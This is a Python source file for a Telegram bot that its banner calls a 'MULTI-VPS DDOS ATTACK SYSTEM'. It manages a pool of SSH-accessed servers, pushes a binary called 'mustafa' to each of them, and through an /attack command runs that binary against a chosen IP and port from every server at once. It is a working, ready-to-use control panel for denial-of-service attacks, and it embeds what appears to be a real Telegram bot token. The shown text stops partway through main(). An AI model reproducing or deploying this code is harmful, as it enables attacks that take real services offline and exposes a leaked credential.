import os
import time
import asyncio
import json
import paramiko
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from datetime import datetime
import threading

# ==================== CONFIG ====================
TELEGRAM_TOKEN = "8739965850:AAH9omZ01ouCVw5TEmhrahUxD3wT1BsqprY"
ADMIN_ID = 8179218740  # YOUR ADMIN ID HERE
VPS_FILE = "vps_servers.json"
MAX_ATTACK_TIME = 300  # 5 minutes max

# Approved users list (can use attack commands)
APPROVED_USERS = [123456789]  # Add approved user IDs here

# Global variables
vps_servers = []
is_attack_running = False
current_attack_id = None
user_sessions = {}
upload_session = {}  # For binary upload session

# ==================== LOAD/SAVE VPS ====================
def load_vps():
    global vps_servers
    if os.path.exists(VPS_FILE):
        try:
            with open(VPS_FILE, 'r') as f:
                vps_servers = json.load(f)
        except:
            vps_servers = []
    return vps_servers

def save_vps():
    with open(VPS_FILE, 'w') as f:
        json.dump(vps_servers, f)

# Initial load
load_vps()

# ==================== BANNER ====================
BANNER = """
╔══════════════════════════════════════════════════╗
║     🔥 MULTI-VPS DDOS ATTACK SYSTEM v2.0 🔥      ║
║     ⚡ Attack from ALL VPS simultaneously ⚡      ║
║     👑 Owner: @SIDIKI_MUSTAFA_92 👑              ║
╚══════════════════════════════════════════════════╝
"""

# Colors for terminal
G = '\033[92m'
Y = '\033[93m'
C = '\033[96m'
R = '\033[0m'

# ==================== AUTHORIZATION CHECK ====================
def is_admin(user_id):
    return user_id == ADMIN_ID

def is_approved(user_id):
    return user_id in APPROVED_USERS or user_id == ADMIN_ID

# ==================== COMMANDS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    user_id = update.effective_user.id
    
    if not is_approved(user_id):
        await update.message.reply_text("❌ You are not authorized to use this bot!")
        return
    
    if is_admin(user_id):
        # Admin menu with all options
        text = f"""
{BANNER}

👑 **ADMIN PANEL** 👑

📋 **AVAILABLE COMMANDS:**

🔐 **VPS MANAGEMENT (Admin Only):**
/add_vps - Add new VPS (via interactive buttons)
/remove_vps <ip> - Remove VPS
/list_vps - List all VPS servers
/test_vps - Test connection to all VPS
/upload - Upload binary to all VPS
/approve <user_id> - Approve user for attack
/remove <user_id> - Remove approved user
/list_users - List approved users

⚡ **ATTACK COMMANDS (Approved Users):**
/attack <ip> <port> <time> - Start attack from ALL VPS
/status - Check attack status

📊 **SYSTEM STATS:**
/stats - Show system statistics
/help - Show this help

🔥 **Total VPS: {len(vps_servers)}**
✅ **Ready for massive attack!**
        """
    else:
        # Approved user menu (limited)
        text = f"""
{BANNER}

👤 **USER PANEL** 👤

⚡ **ATTACK COMMANDS:**
/attack <ip> <port> <time> - Start attack from ALL VPS
/status - Check attack status

📊 **SYSTEM STATS:**
/stats - Show system statistics

🔥 **Total VPS: {len(vps_servers)}**
✅ **Ready for attack!**
        """
    
    # Create keyboard based on user type
    if is_admin(user_id):
        keyboard = [
            [InlineKeyboardButton("➕ Add VPS", callback_data="add_vps_menu")],
            [InlineKeyboardButton("📋 List VPS", callback_data="list_vps"), 
             InlineKeyboardButton("📊 Stats", callback_data="show_stats")],
            [InlineKeyboardButton("✅ Test VPS", callback_data="test_vps"), 
             InlineKeyboardButton("📤 Upload Binary", callback_data="upload_binary")]
        ]
    else:
        keyboard = [
            [InlineKeyboardButton("📊 Stats", callback_data="show_stats")],
            [InlineKeyboardButton("✅ Test VPS", callback_data="test_vps")]
        ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=reply_markup)

# ==================== ADMIN ONLY COMMANDS ====================
async def add_vps_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start add VPS process with buttons (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    keyboard = [
        [InlineKeyboardButton("🖥️ Direct VPS (Password)", callback_data="add_direct_vps")],
        [InlineKeyboardButton("☁️ AWS VPS (PEM File)", callback_data="add_aws_vps")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🔐 **SELECT VPS TYPE:**\n\n"
        "🖥️ **Direct VPS** - Normal VPS with password\n"
        "☁️ **AWS VPS** - AWS EC2 with .pem file\n\n"
        "Choose option:",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )

async def remove_vps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove VPS server (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: `/remove_vps <ip>`", parse_mode="Markdown")
        return
    
    ip = context.args[0]
    
    for i, vps in enumerate(vps_servers):
        if vps['ip'] == ip:
            # Delete pem file if exists
            if vps.get('pem_path') and os.path.exists(vps['pem_path']):
                os.remove(vps['pem_path'])
            removed = vps_servers.pop(i)
            save_vps()
            await update.message.reply_text(
                f"✅ **VPS REMOVED**\n\n"
                f"🌍 IP: `{ip}`\n"
                f"🔐 Auth: `{removed.get('auth_type', 'password')}`\n"
                f"📊 Remaining: `{len(vps_servers)}`",
                parse_mode="Markdown"
            )
            return
    
    await update.message.reply_text(f"❌ VPS {ip} not found!")

async def list_vps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all VPS servers (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if not vps_servers:
        await update.message.reply_text("❌ No VPS servers added!")
        return
    
    text = "📋 **VPS SERVERS LIST**\n\n"
    
    for i, vps in enumerate(vps_servers, 1):
        status_emoji = "✅" if vps.get('status') == 'active' else "❌"
        auth_emoji = "🔐" if vps.get('auth_type') == 'password' else "🔑"
        
        text += f"{status_emoji} **VPS #{i}**\n"
        text += f"   🌍 IP: `{vps['ip']}`\n"
        text += f"   🔌 Port: `{vps['port']}`\n"
        text += f"   👤 User: `{vps['username']}`\n"
        text += f"   {auth_emoji} Auth: `{vps.get('auth_type', 'password')}`\n"
        
        if vps.get('auth_type') == 'pem':
            text += f"   📁 PEM: `{os.path.basename(vps.get('pem_path', 'N/A'))}`\n"
        
        text += f"   ⚡ Attacks: `{vps.get('attack_count', 0)}`\n"
        text += f"   📅 Added: `{datetime.fromtimestamp(vps.get('added_at', 0)).strftime('%Y-%m-%d')}`\n\n"
    
    text += f"📊 **TOTAL VPS: {len(vps_servers)}**"
    
    await update.message.reply_text(text, parse_mode="Markdown")

async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Approve a user for attack commands (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: `/approve <user_id>`", parse_mode="Markdown")
        return
    
    try:
        new_user_id = int(context.args[0])
        if new_user_id not in APPROVED_USERS:
            APPROVED_USERS.append(new_user_id)
            await update.message.reply_text(
                f"✅ **USER APPROVED**\n\n"
                f"👤 User ID: `{new_user_id}`\n"
                f"📊 Total Approved: `{len(APPROVED_USERS)}`",
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text(f"❌ User {new_user_id} already approved!")
    except:
        await update.message.reply_text("❌ Invalid user ID!")

async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove approved user (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: `/remove <user_id>`", parse_mode="Markdown")
        return
    
    try:
        remove_user_id = int(context.args[0])
        if remove_user_id in APPROVED_USERS and remove_user_id != ADMIN_ID:
            APPROVED_USERS.remove(remove_user_id)
            await update.message.reply_text(
                f"✅ **USER REMOVED**\n\n"
                f"👤 User ID: `{remove_user_id}`\n"
                f"📊 Total Approved: `{len(APPROVED_USERS)}`",
                parse_mode="Markdown"
            )
        elif remove_user_id == ADMIN_ID:
            await update.message.reply_text("❌ Cannot remove admin!")
        else:
            await update.message.reply_text(f"❌ User {remove_user_id} not found!")
    except:
        await update.message.reply_text("❌ Invalid user ID!")

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all approved users (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    text = "📋 **APPROVED USERS**\n\n"
    text += f"👑 **Admin:** `{ADMIN_ID}`\n\n"
    text += "✅ **Approved Users:**\n"
    
    for i, uid in enumerate(APPROVED_USERS, 1):
        if uid != ADMIN_ID:
            text += f"{i}. `{uid}`\n"
    
    text += f"\n📊 **Total: {len(APPROVED_USERS)}**"
    
    await update.message.reply_text(text, parse_mode="Markdown")

async def upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start binary upload process (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if not vps_servers:
        await update.message.reply_text("❌ No VPS servers added!")
        return
    
    upload_session[user_id] = {'step': 'waiting_for_binary'}
    
    await update.message.reply_text(
        "📤 **BINARY UPLOAD**\n\n"
        "Please send the `mustafa` binary file as a document.\n\n"
        "📎 Click the attachment icon and send the file.",
        parse_mode="Markdown"
    )

# ==================== APPROVED USER COMMANDS ====================
async def attack_vps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Launch attack from ALL VPS simultaneously (Approved users only)"""
    global is_attack_running, current_attack_id
    
    user_id = update.effective_user.id
    
    if not is_approved(user_id):
        await update.message.reply_text("❌ You are not authorized to use attack commands!")
        return
    
    if is_attack_running:
        await update.message.reply_text("❌ Attack already running! Wait for it to finish.")
        return
    
    if len(context.args) != 3:
        await update.message.reply_text(
            "❌ **Usage:** `/attack <target_ip> <port> <time>`\n\n"
            "📝 **Example:**\n"
            "`/attack 192.168.1.200 80 60`",
            parse_mode="Markdown"
        )
        return
    
    target_ip, port, duration = context.args
    
    try:
        duration = int(duration)
        if duration > MAX_ATTACK_TIME:
            await update.message.reply_text(f"❌ Max attack time is {MAX_ATTACK_TIME} seconds!")
            return
    except:
        await update.message.reply_text("❌ Invalid time!")
        return
    
    if not vps_servers:
        await update.message.reply_text("❌ No VPS servers added!")
        return
    
    # Filter active VPS
    active_vps = [vps for vps in vps_servers if vps.get('status') == 'active']
    
    if not active_vps:
        await update.message.reply_text("❌ No active VPS! Contact admin.")
        return
    
    msg = await update.message.reply_text(
        f"🚀 **LAUNCHING MASSIVE ATTACK!**\n\n"
        f"🎯 Target: `{target_ip}:{port}`\n"
        f"⏱️ Duration: `{duration}s`\n"
        f"🖥️ VPS Count: `{len(active_vps)}`\n"
        f"⚡ Status: Starting attack...",
        parse_mode="Markdown"
    )
    
    is_attack_running = True
    current_attack_id = str(int(time.time()))
    
    # Launch attack in background
    asyncio.create_task(run_massive_attack(update, context, active_vps, target_ip, port, duration, msg))

async def attack_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check attack status (Approved users only)"""
    user_id = update.effective_user.id
    
    if not is_approved(user_id):
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    status = "🟢 READY" if not is_attack_running else "🔴 ATTACK RUNNING"
    
    active_vps = sum(1 for v in vps_servers if v.get('status') == 'active')
    total_vps = len(vps_servers)
    
    await update.message.reply_text(
        f"📊 **ATTACK STATUS**\n\n"
        f"⚡ Status: `{status}`\n"
        f"🖥️ Active VPS: `{active_vps}/{total_vps}`\n"
        f"🎯 Attack ID: `{current_attack_id if is_attack_running else 'None'}`",
        parse_mode="Markdown"
    )

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show system statistics (All approved users)"""
    user_id = update.effective_user.id
    
    if not is_approved(user_id):
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    active_vps = sum(1 for v in vps_servers if v.get('status') == 'active')
    dead_vps = sum(1 for v in vps_servers if v.get('status') == 'dead')
    no_binary = sum(1 for v in vps_servers if v.get('status') == 'no_binary')
    
    password_vps = sum(1 for v in vps_servers if v.get('auth_type') == 'password')
    pem_vps = sum(1 for v in vps_servers if v.get('auth_type') == 'pem')
    
    total_attacks = sum(v.get('attack_count', 0) for v in vps_servers)
    
    await update.message.reply_text(
        f"📊 **SYSTEM STATISTICS**\n\n"
        f"🖥️ **VPS Status:**\n"
        f"• Total VPS: `{len(vps_servers)}`\n"
        f"• ✅ Active: `{active_vps}`\n"
        f"• ⚠️ No Binary: `{no_binary}`\n"
        f"• ❌ Dead: `{dead_vps}`\n\n"
        f"🔐 **Auth Types:**\n"
        f"• Password: `{password_vps}`\n"
        f"• PEM File: `{pem_vps}`\n\n"
        f"⚡ **Attack Stats:**\n"
        f"• Total Attacks: `{total_attacks}`\n"
        f"• Attack Running: `{'Yes' if is_attack_running else 'No'}`\n\n"
        f"🔧 **Configuration:**\n"
        f"• Max Attack Time: `{MAX_ATTACK_TIME}s`",
        parse_mode="Markdown"
    )

# ==================== ATTACK FUNCTION ====================
async def run_massive_attack(update, context, vps_list, target_ip, port, duration, msg):
    """Run attack on all VPS simultaneously"""
    global is_attack_running
    
    successful = 0
    failed = 0
    results = []
    
    # Function to attack single VPS
    def attack_single_vps(vps):
        nonlocal successful, failed
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Connect based on auth type
            if vps.get('auth_type') == 'pem':
                client.connect(
                    vps['ip'], 
                    port=vps['port'], 
                    username=vps['username'], 
                    key_filename=vps['pem_path'],
                    timeout=10
                )
            else:
                client.connect(
                    vps['ip'], 
                    port=vps['port'], 
                    username=vps['username'], 
                    password=vps.get('password', ''),
                    timeout=10
                )
            
            # Kill existing mustafa processes
            client.exec_command("pkill -f mustafa")
            time.sleep(1)
            
            # Start new attack in background
            command = f"cd ~ && nohup ./mustafa {target_ip} {port} {duration} 51 2000 > /dev/null 2>&1 &"
            stdin, stdout, stderr = client.exec_command(command)
            
            client.close()
            
            vps['attack_count'] = vps.get('attack_count', 0) + 1
            vps['last_used'] = time.time()
            successful += 1
            results.append(f"✅ {vps['ip']}: Attack started")
            
        except Exception as e:
            failed += 1
            results.append(f"❌ {vps['ip']}: {str(e)[:30]}")
    
    # Update message
    await msg.edit_text(
        f"🚀 **ATTACK IN PROGRESS**\n\n"
        f"🎯 Target: `{target_ip}:{port}`\n"
        f"⏱️ Duration: `{duration}s`\n"
        f"🖥️ Launching on {len(vps_list)} VPS...\n"
        f"⚡ Please wait...",
        parse_mode="Markdown"
    )
    
    # Launch threads for parallel attacks
    threads = []
    for vps in vps_list:
        thread = threading.Thread(target=attack_single_vps, args=(vps,))
        thread.start()
        threads.append(thread)
        time.sleep(0.5)
    
    # Wait for all to start
    for thread in threads:
        thread.join()
    
    save_vps()
    
    # Show results
    result_text = f"✅ **ATTACK LAUNCHED SUCCESSFULLY!**\n\n"
    result_text += f"🎯 Target: `{target_ip}:{port}`\n"
    result_text += f"⏱️ Duration: `{duration}s`\n"
    result_text += f"🖥️ VPS Total: `{len(vps_list)}`\n"
    result_text += f"✅ Successful: `{successful}`\n"
    result_text += f"❌ Failed: `{failed}`\n\n"
    
    # Show first 5 results
    result_text += "📋 **Details:**\n"
    for res in results[:5]:
        result_text += f"{res}\n"
    
    if len(results) > 5:
        result_text += f"... and {len(results)-5} more\n"
    
    result_text += f"\n⏱️ Attack will run for {duration} seconds..."
    
    await msg.edit_text(result_text, parse_mode="Markdown")
    
    # Wait for attack duration
    await asyncio.sleep(duration)
    
    # Attack finished
    is_attack_running = False
    
    await context.bot.send_message(
        chat_id=update.effective_user.id,
        text=f"✅ **ATTACK COMPLETED!**\n\n"
             f"🎯 Target: `{target_ip}:{port}`\n"
             f"⏱️ Duration: `{duration}s`\n"
             f"🖥️ VPS Used: `{successful}`\n"
             f"⚡ Attack finished successfully!",
        parse_mode="Markdown"
    )

# ==================== MESSAGE HANDLERS ====================
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle document upload for PEM files and binary"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        return
    
    document = update.message.document
    
    # Check if it's binary upload
    if user_id in upload_session:
        if document.file_name == "mustafa" or document.file_name.endswith("mustafa"):
            msg = await update.message.reply_text("📥 Downloading binary...")
            
            # Download the file
            file = await context.bot.get_file(document.file_id)
            await file.download_to_drive("mustafa")
            os.chmod("mustafa", 0o755)
            
            await msg.edit_text("✅ Binary saved locally! Now uploading to all VPS...")
            
            # Upload to all VPS
            successful = 0
            failed = 0
            
            for vps in vps_servers:
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    
                    if vps.get('auth_type') == 'pem':
                        client.connect(
                            vps['ip'], 
                            port=vps['port'], 
                            username=vps['username'], 
                            key_filename=vps['pem_path'],
                            timeout=10
                        )
                    else:
                        client.connect(
                            vps['ip'], 
                            port=vps['port'], 
                            username=vps['username'], 
                            password=vps.get('password', ''),
                            timeout=10
                        )
                    
                    sftp = client.open_sftp()
                    sftp.put("mustafa", "mustafa")
                    sftp.close()
                    
                    client.exec_command("chmod +x mustafa")
                    client.close()
                    
                    vps['status'] = 'active'
                    successful += 1
                    
                except Exception as e:
                    failed += 1
                    vps['status'] = 'dead'
            
            save_vps()
            del upload_session[user_id]
            
            await update.message.reply_text(
                f"📤 **BINARY UPLOAD COMPLETE**\n\n"
                f"✅ Uploaded to: `{successful}` VPS\n"
                f"❌ Failed: `{failed}` VPS\n"
                f"🖥️ Total VPS: `{len(vps_servers)}`",
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text("❌ Please send the file named 'mustafa'")
        return
    
    # Check if it's PEM file for AWS VPS
    if user_id in user_sessions and user_sessions[user_id].get('type') == 'aws' and user_sessions[user_id].get('step') == 'pem_path':
        if not document.file_name.endswith('.pem'):
            await update.message.reply_text("❌ Please upload a .pem file!")
            return
        
        session = user_sessions[user_id]
        
        # Download the file
        file = await context.bot.get_file(document.file_id)
        
        # Create pem directory if not exists
        if not os.path.exists('pem_files'):
            os.makedirs('pem_files')
        
        # Save with IP-based name
        pem_path = f"pem_files/{session['ip']}.pem"
        await file.download_to_drive(pem_path)
        
        # Set proper permissions
        os.chmod(pem_path, 0o400)
        
        # Test connection
        msg = await update.message.reply_text("🔌 Testing connection with PEM...")
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                session['ip'], 
                port=session['port'], 
                username=session['username'], 
                key_filename=pem_path,
                timeout=10
            )
            client.close()
            
            # Add to list
            vps_servers.append({
                'ip': session['ip'],
                'port': session['port'],
                'username': session['username'],
                'auth_type': 'pem',
                'password': None,
                'pem_path': pem_path,
                'status': 'active',
                'added_at': time.time(),
                'last_used': None,
                'attack_count': 0
            })
            save_vps()
            
            await msg.edit_text(
                f"✅ **AWS VPS ADDED SUCCESSFULLY!**\n\n"
                f"🌍 IP: `{session['ip']}`\n"
                f"🔌 Port: `{session['port']}`\n"
                f"👤 Username: `{session['username']}`\n"
                f"🔐 Auth: PEM File\n"
                f"📁 PEM: `{pem_path}`\n"
                f"📊 Total VPS: `{len(vps_servers)}`",
                parse_mode="Markdown"
            )
            
            # Clear session
            del user_sessions[user_id]
            
        except Exception as e:
            await msg.edit_text(f"❌ Connection failed: {str(e)}")
            if os.path.exists(pem_path):
                os.remove(pem_path)

# ==================== CALLBACK HANDLERS ====================
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button presses"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    if not is_approved(user_id):
        await query.edit_message_text("❌ You are not authorized!")
        return
    
    data = query.data
    
    if data == "add_vps_menu" and is_admin(user_id):
        keyboard = [
            [InlineKeyboardButton("🖥️ Direct VPS (Password)", callback_data="add_direct_vps")],
            [InlineKeyboardButton("☁️ AWS VPS (PEM File)", callback_data="add_aws_vps")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "🔐 **SELECT VPS TYPE:**",
            parse_mode="Markdown",
            reply_markup=reply_markup
        )
    
    elif data == "add_direct_vps" and is_admin(user_id):
        user_sessions[user_id] = {'type': 'direct', 'step': 'ip'}
        await query.edit_message_text(
            "📝 **ADD DIRECT VPS**\n\n"
            "Step 1/4: Enter VPS IP Address:\n"
            "Example: `192.168.1.100`",
            parse_mode="Markdown"
        )
    
    elif data == "add_aws_vps" and is_admin(user_id):
        user_sessions[user_id] = {'type': 'aws', 'step': 'ip'}
        await query.edit_message_text(
            "📝 **ADD AWS VPS**\n\n"
            "Step 1/4: Enter VPS IP Address:\n"
            "Example: `54.123.45.67`",
            parse_mode="Markdown"
        )
    
    elif data == "list_vps" and is_admin(user_id):
        if not vps_servers:
            await query.edit_message_text("❌ No VPS servers added!")
            return
        
        text = "📋 **VPS SERVERS LIST**\n\n"
        
        for i, vps in enumerate(vps_servers, 1):
            status_emoji = "✅" if vps.get('status') == 'active' else "❌"
            auth_emoji = "🔐" if vps.get('auth_type') == 'password' else "🔑"
            
            text += f"{status_emoji} **VPS #{i}**\n"
            text += f"   🌍 IP: `{vps['ip']}`\n"
            text += f"   🔌 Port: `{vps['port']}`\n"
            text += f"   👤 User: `{vps['username']}`\n"
            text += f"   {auth_emoji} Auth: `{vps.get('auth_type', 'password')}`\n"
            text += f"   ⚡ Attacks: `{vps.get('attack_count', 0)}`\n\n"
        
        text += f"📊 **TOTAL VPS: {len(vps_servers)}**"
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=reply_markup)
    
    elif data == "show_stats":
        active_vps = sum(1 for v in vps_servers if v.get('status') == 'active')
        dead_vps = sum(1 for v in vps_servers if v.get('status') == 'dead')
        no_binary = sum(1 for v in vps_servers if v.get('status') == 'no_binary')
        
        password_vps = sum(1 for v in vps_servers if v.get('auth_type') == 'password')
        pem_vps = sum(1 for v in vps_servers if v.get('auth_type') == 'pem')
        
        total_attacks = sum(v.get('attack_count', 0) for v in vps_servers)
        
        text = f"""
📊 **SYSTEM STATISTICS**

🖥️ **VPS Status:**
• Total VPS: `{len(vps_servers)}`
• ✅ Active: `{active_vps}`
• ⚠️ No Binary: `{no_binary}`
• ❌ Dead: `{dead_vps}`

🔐 **Auth Types:**
• Password: `{password_vps}`
• PEM File: `{pem_vps}`

⚡ **Attack Stats:**
• Total Attacks: `{total_attacks}`
• Attack Running: `{'Yes' if is_attack_running else 'No'}`

🔧 **Configuration:**
• Max Attack Time: `{MAX_ATTACK_TIME}s`
        """
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=reply_markup)
    
    elif data == "test_vps":
        if not vps_servers:
            await query.edit_message_text("❌ No VPS servers to test!")
            return
        
        await query.edit_message_text("🔄 Testing all VPS connections...")
        
        results = []
        active_count = 0
        
        for vps in vps_servers:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                if vps.get('auth_type') == 'pem':
                    client.connect(
                        vps['ip'], 
                        port=vps['port'], 
                        username=vps['username'], 
                        key_filename=vps['pem_path'],
                        timeout=5
                    )
                else:
                    client.connect(
                        vps['ip'], 
                        port=vps['port'], 
                        username=vps['username'], 
                        password=vps.get('password', ''),
                        timeout=5
                    )
                
                stdin, stdout, stderr = client.exec_command("ls -la mustafa 2>/dev/null && echo 'EXISTS' || echo 'NOTFOUND'")
                output = stdout.read().decode().strip()
                
                client.close()
                
                if 'EXISTS' in output:
                    results.append(f"✅ {vps['ip']}: Connected & mustafa found")
                    vps['status'] = 'active'
                    active_count += 1
                else:
                    results.append(f"⚠️ {vps['ip']}: Connected but mustafa not found")
                    vps['status'] = 'no_binary'
                    
            except Exception as e:
                results.append(f"❌ {vps['ip']}: Failed - {str(e)[:50]}")
                vps['status'] = 'dead'
        
        save_vps()
        
        result_text = "📊 **VPS TEST RESULTS**\n\n"
        result_text += "\n".join(results[:10])
        if len(results) > 10:
            result_text += f"\n... and {len(results)-10} more"
        result_text += f"\n\n✅ Active: {active_count}/{len(vps_servers)}"
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(result_text, parse_mode="Markdown", reply_markup=reply_markup)
    
    elif data == "upload_binary" and is_admin(user_id):
        if not vps_servers:
            await query.edit_message_text("❌ No VPS servers!")
            return
        
        upload_session[user_id] = {'step': 'waiting_for_binary'}
        
        await query.edit_message_text(
            "📤 **BINARY UPLOAD**\n\n"
            "Please send the `mustafa` binary file as a document.",
            parse_mode="Markdown"
        )
    
    elif data == "back_to_main":
        if is_admin(user_id):
            keyboard = [
                [InlineKeyboardButton("➕ Add VPS", callback_data="add_vps_menu")],
                [InlineKeyboardButton("📋 List VPS", callback_data="list_vps"), 
                 InlineKeyboardButton("📊 Stats", callback_data="show_stats")],
                [InlineKeyboardButton("✅ Test VPS", callback_data="test_vps"), 
                 InlineKeyboardButton("📤 Upload Binary", callback_data="upload_binary")]
            ]
        else:
            keyboard = [
                [InlineKeyboardButton("📊 Stats", callback_data="show_stats")],
                [InlineKeyboardButton("✅ Test VPS", callback_data="test_vps")]
            ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"{BANNER}\n\n📋 **MAIN MENU**\nChoose an option:",
            parse_mode="Markdown",
            reply_markup=reply_markup
        )

# ==================== MESSAGE HANDLERS ====================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages for multi-step input"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        return
    
    if user_id not in user_sessions:
        return
    
    session = user_sessions[user_id]
    text = update.message.text
    
    if session['type'] == 'direct':
        if session['step'] == 'ip':
            session['ip'] = text
            session['step'] = 'port'
            await update.message.reply_text(
                "✅ IP saved!\n\n"
                "Step 2/4: Enter SSH Port:\n"
                "Example: `22`"
            )
        
        elif session['step'] == 'port':
            try:
                session['port'] = int(text)
                session['step'] = 'username'
                await update.message.reply_text(
                    "✅ Port saved!\n\n"
                    "Step 3/4: Enter Username:\n"
                    "Example: `root` or `ubuntu`"
                )
            except:
                await update.message.reply_text("❌ Invalid port! Enter number:")
        
        elif session['step'] == 'username':
            session['username'] = text
            session['step'] = 'password'
            await update.message.reply_text(
                "✅ Username saved!\n\n"
                "Step 4/4: Enter Password:"
            )
        
        elif session['step'] == 'password':
            session['password'] = text
            
            # Test connection and save
            msg = await update.message.reply_text("🔌 Testing connection...")
            
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(
                    session['ip'], 
                    port=session['port'], 
                    username=session['username'], 
                    password=session['password'], 
                    timeout=10
                )
                client.close()
                
                # Add to list
                vps_servers.append({
                    'ip': session['ip'],
                    'port': session['port'],
                    'username': session['username'],
                    'auth_type': 'password',
                    'password': session['password'],
                    'pem_path': None,
                    'status': 'active',
                    'added_at': time.time(),
                    'last_used': None,
                    'attack_count': 0
                })
                save_vps()
                
                await msg.edit_text(
                    f"✅ **VPS ADDED SUCCESSFULLY!**\n\n"
                    f"🌍 IP: `{session['ip']}`\n"
                    f"🔌 Port: `{session['port']}`\n"
                    f"👤 Username: `{session['username']}`\n"
                    f"🔐 Auth: Password\n"
                    f"📊 Total VPS: `{len(vps_servers)}`",
                    parse_mode="Markdown"
                )
                
                # Clear session
                del user_sessions[user_id]
                
            except Exception as e:
                await msg.edit_text(f"❌ Connection failed: {str(e)}")
    
    elif session['type'] == 'aws':
        if session['step'] == 'ip':
            session['ip'] = text
            session['step'] = 'port'
            await update.message.reply_text(
                "✅ IP saved!\n\n"
                "Step 2/4: Enter SSH Port:\n"
                "Example: `22`"
            )
        
        elif session['step'] == 'port':
            try:
                session['port'] = int(text)
                session['step'] = 'username'
                await update.message.reply_text(
                    "✅ Port saved!\n\n"
                    "Step 3/4: Enter Username:\n"
                    "Example: `ubuntu` or `ec2-user`"
                )
            except:
                await update.message.reply_text("❌ Invalid port! Enter number:")
        
        elif session['step'] == 'username':
            session['username'] = text
            session['step'] = 'pem_path'
            await update.message.reply_text(
                "✅ Username saved!\n\n"
                "Step 4/4: **Send the .pem file**\n\n"
                "📎 Please upload your .pem file as a document.",
                parse_mode="Markdown"
            )

# ==================== MAIN ====================
def main():
    print(BANNER)
    print(f"{G}✅ Loading VPS: {len(vps_servers)} servers found")
    print(f"{C}✅ Bot starting...")
    
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    
    # Admin only commands
    app.add_handler(CommandHandler("add_vps", add_vps_command))
    app.add_handler(CommandHandler("remove_vps", remove_vps))
    app.add_handler(CommandHandler("list_vps", list_vps))
    app.add_handler(CommandHandler("approve", approve_user))
    app.add_handler(CommandHandler("remove", remove_user))
    app.add_handler(CommandHandler("list_users", list_users))
    app.add_handler(CommandHandler("upload", upload_command))
    
    # Approved users commands
    app.add_handler(CommandHandler("attack", attack_vps))
    app.add_handler(CommandHandler("status", attack_status))
    app.add_handler(CommandHandler("stats", stats))
    
    # Public commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", start))
    
    # Callback handler for buttons
    app.add_handler(CallbackQueryHandler(button_callback))
    
    # Message handlers
